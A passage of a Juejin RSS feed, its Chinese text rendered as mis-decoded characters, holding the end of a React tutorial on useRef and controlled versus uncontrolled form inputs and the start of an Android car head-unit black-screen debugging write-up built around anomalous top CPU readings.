    <span class="hljs-comment">// é˜»æ­¢æµè§ˆå™¨è¡¨å•æäº¤çš„é»˜è®¤è¡Œä¸ºï¼ˆé»˜è®¤ä¼šåˆ·æ–°é¡µé¢ï¼Œç ´å React å•é¡µåº”ç”¨çš„è¿è¡ŒçŠ¶æ€ï¼‰</span>
    e.<span class="hljs-title function_">preventDefault</span>();
    <span class="hljs-comment">// é€šè¿‡ ref å¼•ç”¨å¯¹è±¡çš„ current å±æ€§ï¼Œè·å–ç¬¬äºŒä¸ªè¾“å…¥æ¡†çš„ DOM å…ƒç´ ï¼Œè¯»å–å…¶ value å±æ€§ï¼ˆç”¨æˆ·è¾“å…¥å†…å®¹ï¼‰å¹¶æ‰“å°</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(inputRef.<span class="hljs-property">current</span>.<span class="hljs-property">value</span>);
  }

  <span class="hljs-comment">// æ¸²æŸ“ç»„ä»¶çš„ UI ç»“æ„</span>
  <span class="hljs-keyword">return</span> (
    <span class="hljs-comment">// è¡¨å•æ ‡ç­¾ï¼Œç»‘å®š onSubmit äº‹ä»¶ï¼Œæäº¤æ—¶è§¦å‘ doLogin å¤„ç†å‡½æ•°</span>
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">onSubmit</span>=<span class="hljs-string">{doLogin}</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
        {/* å®æ—¶æ¸²æŸ“å—æ§ç»„ä»¶çš„çŠ¶æ€å€¼ valueï¼Œç›´è§‚å±•ç¤ºè¾“å…¥å†…å®¹ä¸ React çŠ¶æ€çš„åŒæ­¥æ•ˆæœ */}
        {value}
        
        {/* ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†ï¼šå—æ§ç»„ä»¶ï¼ˆç”± React çŠ¶æ€ç®¡ç†è¾“å…¥å€¼ï¼‰ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
          <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span>  // <span class="hljs-attr">è¾“å…¥æ¡†ç±»å‹ä¸ºæ–‡æœ¬è¾“å…¥</span>
          <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>  // <span class="hljs-attr">å°†</span> <span class="hljs-attr">React</span> <span class="hljs-attr">çŠ¶æ€</span> <span class="hljs-attr">value</span> <span class="hljs-attr">ç»‘å®šåˆ°è¾“å…¥æ¡†çš„</span> <span class="hljs-attr">value</span> <span class="hljs-attr">å±æ€§</span>ï¼Œ<span class="hljs-attr">è®©çŠ¶æ€æ§åˆ¶è¾“å…¥æ¡†çš„æ˜¾ç¤ºå†…å®¹</span>
          <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> setValue(e.target.value)}  // ç»‘å®šè¾“å…¥å˜åŒ–äº‹ä»¶
          // è¾“å…¥å˜åŒ–æ—¶ï¼Œè·å–è¾“å…¥æ¡†å½“å‰å€¼ï¼ˆe.target.valueï¼‰ï¼Œè°ƒç”¨ setValue æ›´æ–° React çŠ¶æ€ value
          // å®ç°ã€Œè¾“å…¥å˜åŒ– â†’ æ›´æ–°çŠ¶æ€ â†’ æ›´æ–° UIã€çš„é—­ç¯ï¼Œä¿æŒçŠ¶æ€ä¸è¾“å…¥æ¡†å†…å®¹ä¸€è‡´
        /&gt;

        {/* ç¬¬äºŒä¸ªè¾“å…¥æ¡†ï¼šéå—æ§ç»„ä»¶ï¼ˆç”± DOM è‡ªèº«ç®¡ç†è¾“å…¥å€¼ï¼‰ */}
        {/* ä¸ç»‘å®š value å±æ€§å’Œ onChange äº‹ä»¶ï¼Œä»…é€šè¿‡ ref å±æ€§ç»‘å®š inputRefï¼Œç”¨äºåç»­è·å– DOM å…ƒç´ çš„å€¼ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{inputRef}</span> /&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      {/* è¡¨å•æäº¤æŒ‰é’®ï¼Œtype="submit" ç‚¹å‡»åä¼šè§¦å‘è¡¨å•çš„ onSubmit äº‹ä»¶ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"submit"</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span></span>
  )
}
</code></pre>
<p><strong>ä»£ç æ•ˆæœè§£é‡Šï¼š</strong></p>
<p>è¿™æ®µä»£ç åœ¨ä¸€ä¸ªç®€å•çš„ç™»å½•è¡¨å•ä¸­ï¼ŒåŒæ—¶å®ç°äº†<strong>å—æ§ç»„ä»¶</strong>å’Œ<strong>éå—æ§ç»„ä»¶</strong>ä¸¤ç§ React è¡¨å•å¤„ç†æ¨¡å¼ï¼š</p>
<p>å…¶ä¸­ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†æ˜¯å—æ§ç»„ä»¶ï¼Œå®ƒé€šè¿‡Â <code>useState</code>Â å®šä¹‰å“åº”å¼çŠ¶æ€Â <code>value</code>ï¼Œä»¥Â <code>value={value}</code>Â å®ç° React çŠ¶æ€å¯¹è¾“å…¥æ¡†æ˜¾ç¤ºå€¼çš„å•å‘ç»‘å®šï¼Œåˆé€šè¿‡Â <code>onChange</code>Â äº‹ä»¶ç›‘å¬è¾“å…¥å˜åŒ–ï¼Œå®æ—¶è°ƒç”¨Â <code>setValue(e.target.value)</code>Â å°† DOM è¾“å…¥å€¼åŒæ­¥åˆ° React çŠ¶æ€ä¸­ï¼Œè¾“å…¥æ¡†çš„æ‰€æœ‰çŠ¶æ€å®Œå…¨ç”± React ç®¡æ§ï¼Œè¿˜èƒ½é€šè¿‡é¡µé¢ä¸Šæ¸²æŸ“Â <code>{value}</code>Â å®æ—¶é¢„è§ˆè¾“å…¥å†…å®¹ã€‚</p>
<p>è€Œç¬¬äºŒä¸ªè¾“å…¥æ¡†æ˜¯éå—æ§ç»„ä»¶ï¼Œå®ƒä¸ä¾èµ– React çŠ¶æ€ç®¡ç†ï¼Œä»…é€šè¿‡Â <code>useRef</code>Â åˆ›å»ºçš„Â <code>inputRef</code>Â ç»‘å®šåˆ° DOM å…ƒç´ ï¼Œè¾“å…¥å†…å®¹ç›´æ¥å­˜å‚¨åœ¨ DOM è‡ªèº«çš„Â <code>value</code>Â å±æ€§ä¸­ï¼Œä¸åœ¨è¾“å…¥è¿‡ç¨‹ä¸­åšå®æ—¶çŠ¶æ€åŒæ­¥ï¼ˆä»£ç ä¸­çš„éå—æ§ç»„ä»¶ä»…é€šè¿‡Â <code>ref</code>Â ç»‘å®š DOM å…ƒç´ ï¼Œè¾“å…¥å†…å®¹åªå­˜å‚¨åœ¨ DOM è‡ªèº«çš„Â <code>value</code>Â å±æ€§ä¸­ï¼Œæ²¡æœ‰è§¦å‘ä»»ä½• React çŠ¶æ€æ›´æ–°ï¼Œä¹Ÿä¸ä¼šè§¦å‘ç»„ä»¶é‡æ¸²æŸ“ï¼Œå› æ­¤æ— æ³•ç›´æ¥åƒå—æ§ç»„ä»¶é‚£æ ·å®æ—¶å±•ç¤ºè¾“å…¥å†…å®¹ã€‚ï¼‰ï¼Œä»…åœ¨è¡¨å•æäº¤ï¼ˆè§¦å‘Â <code>doLogin</code>Â å‡½æ•°ï¼‰æ—¶ï¼Œé€šè¿‡Â <code>inputRef.current.value</code>Â æŒ‰éœ€è¯»å– DOM ä¸­çš„è¾“å…¥å€¼ï¼ŒåŒæ—¶è¡¨å•æäº¤æ—¶é€šè¿‡Â <code>e.preventDefault()</code>Â é˜»æ­¢äº†æµè§ˆå™¨é»˜è®¤çš„é¡µé¢åˆ·æ–°è¡Œä¸ºï¼Œæ¸…æ™°å¯¹æ¯”äº† React ä¸¤ç§è¡¨å•å¤„ç†æ–¹å¼çš„æ ¸å¿ƒå·®å¼‚ä¸å®ç°é€»è¾‘ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a5842697edc48149d19f7db4abedfb1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb3h1ZV8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767893112&amp;x-signature=Y5h8GZ66i3SedlQuxracBHlQl%2FQ%3D" alt="QQ202612-1857.gif" loading="lazy"/></p>
<h3 data-id="heading-16">ä¸‰ã€é¢è¯•å®˜ä¼šé—® ğŸ¤”</h3>
<ol>
<li><strong>useRef å’Œ useState çš„æ ¸å¿ƒåŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</strong> ç­”ï¼šuseRef å­˜å‚¨çš„æ˜¯ â€œéå“åº”å¼â€ çš„æŒä¹…åŒ–å€¼ï¼Œä¿®æ”¹Â <code>current</code>Â ä¸ä¼šè§¦å‘é‡æ¸²æŸ“ï¼›useState ç®¡ç†çš„æ˜¯å“åº”å¼çŠ¶æ€ï¼Œè°ƒç”¨ setter ä¼šè§¦å‘é‡æ¸²æŸ“ã€‚useRef é€‚åˆå­˜å‚¨è·¨æ¸²æŸ“å‘¨æœŸçš„é UI ç›¸å…³æ•°æ®ï¼ˆå¦‚ DOMã€å®šæ—¶å™¨ IDï¼‰ï¼ŒuseState é€‚åˆç®¡ç†å½±å“ UI çš„çŠ¶æ€ã€‚</li>
<li><strong>ä¸ºä»€ä¹ˆ useRef èƒ½è·¨ç»„ä»¶æ¸²æŸ“å‘¨æœŸä¿å­˜å€¼ï¼Ÿ</strong> ç­”ï¼šå› ä¸º useRef è¿”å›çš„ ref å®¹å™¨å¯¹è±¡åœ¨ç»„ä»¶æ•´ä¸ªç”Ÿå‘½å‘¨æœŸå†…å¼•ç”¨åœ°å€ä¸å˜ï¼Œå³ä½¿ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œè¿™ä¸ªå¯¹è±¡ä¹Ÿä¸ä¼šè¢«é‡æ–°åˆ›å»ºï¼Œæ‰€ä»¥Â <code>current</code>Â å±æ€§å­˜å‚¨çš„å€¼èƒ½è¢«æŒä¹…åŒ–ã€‚</li>
<li><strong>å—æ§ç»„ä»¶å’Œéå—æ§ç»„ä»¶çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿåˆ†åˆ«é€‚åˆä»€ä¹ˆåœºæ™¯ï¼Ÿ</strong> ç­”ï¼šå—æ§ç»„ä»¶ç”± React çŠ¶æ€ç®¡ç†å€¼ï¼Œé€šè¿‡Â <code>value</code>Â å’ŒÂ <code>onChange</code>Â ç»‘å®šï¼Œé€‚åˆå®æ—¶éªŒè¯ã€è¡¨å•è”åŠ¨ï¼›éå—æ§ç»„ä»¶ç”± DOM ç®¡ç†å€¼ï¼Œé€šè¿‡ ref è·å–ï¼Œé€‚åˆä¸€æ¬¡æ€§è¯»å–ã€æ–‡ä»¶ä¸Šä¼ ç­‰åœºæ™¯ã€‚</li>
<li><strong>å¦‚ä½•ç”¨ useRef æ“ä½œ DOM å…ƒç´ ï¼Ÿ</strong> ç­”ï¼šå…ˆç”¨Â <code>useRef(null)</code>Â åˆ›å»º ref å¯¹è±¡ï¼Œç„¶åé€šè¿‡Â <code>ref</code>Â å±æ€§ç»‘å®šåˆ° DOM å…ƒç´ ï¼Œå½“ç»„ä»¶æŒ‚è½½åï¼Œ<code>ref.current</code>Â å°±ä¼šæŒ‡å‘è¯¥ DOM å…ƒç´ ï¼Œè¿›è€Œå¯ä»¥è°ƒç”¨ DOM æ–¹æ³•ï¼ˆå¦‚Â <code>focus()</code>ã€<code>scrollIntoView()</code>ï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-17">å››ã€ç»“è¯­ ğŸŒŸ</h3>
<p>ä»Šå¤©å’±ä»¬è¯¦ç»†å­¦ä¹ äº† useRefã€useState ä»¥åŠå—æ§ç»„ä»¶å’Œéå—æ§ç»„ä»¶çš„çŸ¥è¯†ã€‚useRef å°±åƒä¸€ä¸ª â€œæŒä¹…åŒ–çš„å·¥å…·ç®±â€ï¼Œå¸®æˆ‘ä»¬å­˜å‚¨è·¨æ¸²æŸ“å‘¨æœŸçš„æ•°æ®å’Œæ“ä½œ DOMï¼›è€Œå—æ§ä¸éå—æ§ç»„ä»¶åˆ™æ˜¯è¡¨å•å¤„ç†çš„ä¸¤ç§æ€è·¯ï¼Œå„æœ‰é€‚ç”¨åœºæ™¯ã€‚</p>
<p>å…¶å®è¿™äº›çŸ¥è¯†ç‚¹å¹¶ä¸éš¾ï¼Œå…³é”®æ˜¯å¤šåŠ¨æ‰‹å®è·µï½ æ¯”å¦‚ç”¨å—æ§ç»„ä»¶åšä¸€ä¸ªå¸¦å®æ—¶éªŒè¯çš„ç™»å½•è¡¨å•ï¼Œç”¨ useRef å®ç°ä¸€ä¸ªè‡ªåŠ¨èšç„¦çš„æœç´¢æ¡†ï¼Œç›¸ä¿¡ç»ƒä¹ ä¹‹åå¤§å®¶ä¼šç†è§£å¾—æ›´é€å½»ï¼ğŸ˜˜</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸€æ¬¡ Android è½¦æœºé»‘å±é—®é¢˜çš„æ·±åº¦å‰–æï¼šå½“æ˜¾ç¤ºé©±åŠ¨é‡ä¸Šä¸­æ–­é£æš´]]></title>    <link>https://juejin.cn/post/7590054976488964136</link>    <guid>https://juejin.cn/post/7590054976488964136</guid>    <pubDate>2026-01-02T01:51:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976488964136" data-draft-id="7590054976488947752" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸€æ¬¡ Android è½¦æœºé»‘å±é—®é¢˜çš„æ·±åº¦å‰–æï¼šå½“æ˜¾ç¤ºé©±åŠ¨é‡ä¸Šä¸­æ–­é£æš´"/> <meta itemprop="keywords" content="Android,æ€§èƒ½ä¼˜åŒ–,Debug"/> <meta itemprop="datePublished" content="2026-01-02T01:51:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†¬å¥‡Lab"/> <meta itemprop="url" content="https://juejin.cn/user/1857501105781193"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸€æ¬¡ Android è½¦æœºé»‘å±é—®é¢˜çš„æ·±åº¦å‰–æï¼šå½“æ˜¾ç¤ºé©±åŠ¨é‡ä¸Šä¸­æ–­é£æš´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857501105781193/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†¬å¥‡Lab
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:51:23.000Z" title="Fri Jan 02 2026 01:51:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»16åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å¼•è¨€</h2>
<p>å‘¨ä¸€æ—©ä¸Šåˆšåˆ°å…¬å¸,äº§å“ç»ç†æ€¥åŒ†åŒ†è·‘æ¥:"ç”¨æˆ·åé¦ˆè½¦æœºå¶å°”ä¼šé»‘å±,ç‰¹åˆ«æ˜¯é¢‘ç¹ç‚¹å‡»ç©ºè°ƒå¼€å…³çš„æ—¶å€™!" ä½œä¸º Android ç³»ç»Ÿå·¥ç¨‹å¸ˆ,æˆ‘å¿ƒé‡Œä¸€ç´§â€”â€”åˆæ˜¯é‚£ç§"å¶ç°"çš„é—®é¢˜,æœ€éš¾æçš„é‚£ç§ã€‚</p>
<p>æ‹¿åˆ°æ—¥å¿—å,æˆ‘ç¬¬ä¸€çœ¼çœ‹åˆ° top è¾“å‡ºé‡Œ ce470_gocsdk è¿›ç¨‹çš„ CPU å ç”¨ç‡æ˜¯ <strong>4753%</strong>ã€‚ä»€ä¹ˆ?8 æ ¸ CPU ç³»ç»Ÿç†è®ºä¸Šé™ä¸æ˜¯ 800% å—?éš¾é“å‘ç°äº†æŸç§"è¶…é¢‘"bug?è¿˜æ˜¯è¯´è¿™ä¸ªè¿›ç¨‹æ‰“ç ´äº†ç‰©ç†å®šå¾‹?</p>
<p>ç»è¿‡ä¸€ç•ªæ·±å…¥åˆ†æ,æˆ‘å‘ç°è¿™èƒŒåéšè—ç€ä¸€ä¸ªæ›´æœ‰è¶£çš„æ•…äº‹:è¿™ä¸æ˜¯ CPU æ­»å¾ªç¯,è€Œæ˜¯ä¸€ä¸ª<strong>æ˜¾ç¤ºé©±åŠ¨å¡æ­»</strong>çš„ç»å…¸æ¡ˆä¾‹,æ¶‰åŠ Linux D çŠ¶æ€ã€ä¸­æ–­é£æš´ã€DRM é©±åŠ¨ç­‰å¤šä¸ªåº•å±‚æœºåˆ¶ã€‚</p>
<p>ä»Šå¤©å°±æ¥åˆ†äº«è¿™æ¬¡æ’æŸ¥ç»å†,çœ‹çœ‹æˆ‘æ˜¯å¦‚ä½•ä»"ä¸å¯èƒ½çš„ 4753%"å¼€å§‹,ä¸€æ­¥æ­¥æ‰¾åˆ°çœŸç›¸çš„ã€‚</p>
<h2 data-id="heading-1">è¿‡ç¨‹é€Ÿè§ˆ</h2>
<ul>
<li><strong>é—®é¢˜</strong>: Android è½¦æœºé»‘å±,æŒç»­ 60-90 ç§’,å¶ç°</li>
<li><strong>è¡¨è±¡</strong>: Top æ˜¾ç¤ºè¿›ç¨‹ CPU 4753%,è¿œè¶…ç†è®ºä¸Šé™ 800%</li>
<li><strong>çœŸç›¸</strong>: æ˜¾ç¤ºé©±åŠ¨ crtc_commit å†…æ ¸çº¿ç¨‹å¡åœ¨ D çŠ¶æ€,å¯¼è‡´æ— æ³•åˆ·æ–°å±å¹•</li>
<li><strong>æ ¹å› </strong>: é«˜ä¸­æ–­è´Ÿè½½(IRQ 81% + SoftIRQ 109%)è§¦å‘æ˜¾ç¤ºé©±åŠ¨æ­»é”</li>
<li><strong>è§£å†³</strong>: Watchdog è‡ªåŠ¨æ£€æµ‹æ¢å¤ + ä¼˜åŒ–ä¸­æ–­å¤„ç† + ä¿®å¤é©±åŠ¨æ­»é”</li>
</ul>
<hr/>
<h2 data-id="heading-2">é—®é¢˜ç°åœºè¿˜åŸ</h2>
<h3 data-id="heading-3">ç”¨æˆ·åé¦ˆ</h3>
<pre><code class="hljs language-scss" lang="scss">ã€æ“ä½œæ­¥éª¤ã€‘æŒç»­ç‚¹å‡»ç©ºè°ƒå¼€å…³æŒ‰é’®
ã€å®é™…ç»“æœã€‘å‡ºç°é»‘å±ç°è±¡,æŒç»­çº¦ <span class="hljs-number">1</span> åˆ†é’Ÿåè‡ªåŠ¨æ¢å¤
ã€æœŸæœ›ç»“æœã€‘ç©ºè°ƒæ­£å¸¸å¼€å¯ä¸å…³é—­,ä¸ä¼šå‡ºç°é»‘å±
ã€å‘ç”Ÿæ¦‚ç‡ã€‘å¶ç°(çº¦ <span class="hljs-number">1</span>/<span class="hljs-number">50</span>)
</code></pre>
<h3 data-id="heading-4">åˆæ­¥æ•°æ®æ”¶é›†</h3>
<p>æ‹¿åˆ°ç°åœºæ—¥å¿—,æˆ‘é¦–å…ˆæ‰§è¡Œäº†å¸¸è§„çš„ top åˆ†æ:</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># top@20251223_11-49-45-743 (é—®é¢˜å‘ç”Ÿæ—¶æ®µ)</span>
top - 11:57:17 up 7:52, 0 <span class="hljs-built_in">users</span>
Tasks: 592 total, 4 running, 587 sleeping, 0 stopped, 1 zombie
%Cpu(s): 4753 user, 5178 sys, 0 <span class="hljs-built_in">nice</span>, 6138 idle, 0 iow, 81 irq, 109 sirq

  PID USER      PR  NI    VIRT    RES    SHR S[%CPU] %MEM     TIME+ ARGS
10785 root      RT -20   52544   4640   3840 S 4753%  0.0 318:26.11 ce470_gocsdk
  642 system    -3  -8 6180892 225340 188588 S  100%  1.3  94:44.62 surfaceflinger
 1580 system    18  -2 3816924 436236 257964 S  200%  2.6  63:22.44 system_server
</code></pre>
<p>ç­‰ç­‰,<code>4753%</code>? è¿™ä¸ç§‘å­¦å•Š!</p>
<hr/>
<h2 data-id="heading-5">ç¬¬ä¸€ä¸ªé™·é˜±:ä¸å¯èƒ½çš„ CPU å ç”¨ç‡</h2>
<h3 data-id="heading-6">ç†è®ºä¸Šé™è®¡ç®—</h3>
<p>åœ¨ Linux ç³»ç»Ÿä¸­,CPU ç™¾åˆ†æ¯”çš„è®¡ç®—å…¬å¼æ˜¯:</p>
<pre><code class="hljs language-scss" lang="scss">CPU% = (process_cpu_time / total_cpu_time) * <span class="hljs-number">100</span> * num_cpus
</code></pre>
<p>å¯¹äº 8 æ ¸ CPU:</p>
<ul>
<li>ç†è®ºæœ€å¤§å€¼ = 100% Ã— 8 = <strong>800%</strong></li>
<li>å•æ ¸æ»¡è½½ = 100%</li>
</ul>
<p>é‚£ä¹ˆ 4753% æ˜¯æ€ä¹ˆæ¥çš„?</p>
<h3 data-id="heading-7">å†·é™åˆ†æ:è¿™æ˜¯æµ‹é‡é”™è¯¯</h3>
<p>æˆ‘ç»§ç»­æŸ¥çœ‹åŒä¸€æ—¶åˆ»çš„å…¶ä»–æ•°æ®:</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">System CPU:</span> <span class="hljs-number">5178</span><span class="hljs-string">%</span>  <span class="hljs-string">â†</span> <span class="hljs-string">ä¹Ÿè¶…è¿‡</span> <span class="hljs-number">800</span><span class="hljs-string">%</span>
<span class="hljs-attr">Idle:</span>       <span class="hljs-number">6138</span><span class="hljs-string">%</span>  <span class="hljs-string">â†</span> <span class="hljs-string">æ›´ç¦»è°±,ç©ºé—²æ—¶é—´ä¹Ÿè¶…äº†</span>
<span class="hljs-attr">Total:</span>      <span class="hljs-string">ä¸ç­‰äº</span> <span class="hljs-number">800</span><span class="hljs-string">%</span> <span class="hljs-string">â†</span> <span class="hljs-string">ç»Ÿè®¡å´©äº†</span>
</code></pre>
<p><strong>ç»“è®º</strong>: å½“å¤šä¸ªå€¼åŒæ—¶è¶…è¿‡ç†è®ºä¸Šé™æ—¶,è¿™ä¸æ˜¯è¿›ç¨‹çš„é—®é¢˜,è€Œæ˜¯ <strong>top ç»Ÿè®¡å·¥å…·æœ¬èº«å‡ºé”™äº†</strong>ã€‚</p>
<h3 data-id="heading-8">Top ä¸ºä»€ä¹ˆä¼šç»Ÿè®¡é”™è¯¯?</h3>
<p>åœ¨é«˜ä¸­æ–­åœºæ™¯ä¸‹,<code>top</code> çš„ç»Ÿè®¡æœºåˆ¶å®¹æ˜“å‡ºé—®é¢˜:</p>
<ol>
<li><strong>æ—¶é—´è®¡æ•°å™¨ä¸åŒæ­¥</strong>: é«˜ä¸­æ–­ç‡å¯¼è‡´ CPU æ—¶é—´è®¡æ•°å™¨æ›´æ–°å»¶è¿Ÿ</li>
<li><strong>é‡‡æ ·å‘¨æœŸè¿‡çŸ­</strong>: <code>top -b -n 1</code> åªé‡‡æ ·ä¸€æ¬¡,è¯¯å·®è¢«æ”¾å¤§</li>
<li><strong>è®¡æ•°å™¨æº¢å‡º</strong>: çŸ­æ—¶é—´å†…è®¡æ•°å™¨å¯èƒ½æº¢å‡ºæˆ–é‡ç½®</li>
</ol>
<p>æˆ‘åœ¨æ—¥å¿—ä¸­æ‰¾åˆ°äº†è¯æ®:</p>
<pre><code class="hljs language-bash" lang="bash">æ—¶é—´ 11:56:42 (é—®é¢˜å‘ç”Ÿ):
